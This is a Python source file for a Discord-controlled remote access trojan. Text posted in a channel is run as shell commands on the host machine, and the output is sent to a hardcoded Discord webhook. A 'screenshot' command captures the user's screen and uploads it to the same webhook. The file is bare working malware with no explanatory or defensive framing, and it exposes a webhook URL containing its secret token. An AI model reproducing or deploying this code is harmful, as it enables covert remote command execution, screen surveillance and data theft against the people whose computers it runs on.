import os
import subprocess
import discord
from discord_webhook import DiscordWebhook
import pyautogui
import datetime


TOKEN = ""

intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)


@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith('command'):
        await message.channel.send('Sent command!')
        command = message.content
        command = command.replace('command ', '')
        hmm = subprocess.run(command, capture_output=True, text=True)
        webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1195633509755265055/PkPWgyJEy9nRZrxcWTMwR88AWjf6X9WoOzo1FC5kSevKrJtMWbOrsZDAA_qWCH79x0dF", content=hmm.stdout)
        response = webhook.execute()

        print(hmm.stdout)
    elif message.content.startswith('screenshot'):
        time_now = datetime.datetime.now()
        await message.channel.send("Took a screenshot!")
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save("help.png")
        webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1195633509755265055/PkPWgyJEy9nRZrxcWTMwR88AWjf6X9WoOzo1FC5kSevKrJtMWbOrsZDAA_qWCH79x0dF", content="Screenshot taken at " + str(time_now))
        with open("./help.png", "rb") as f:
            webhook.add_file(file=f.read(), filename="help.png")
        response = webhook.execute()

        
        
        
        
        
        


client.run(TOKEN)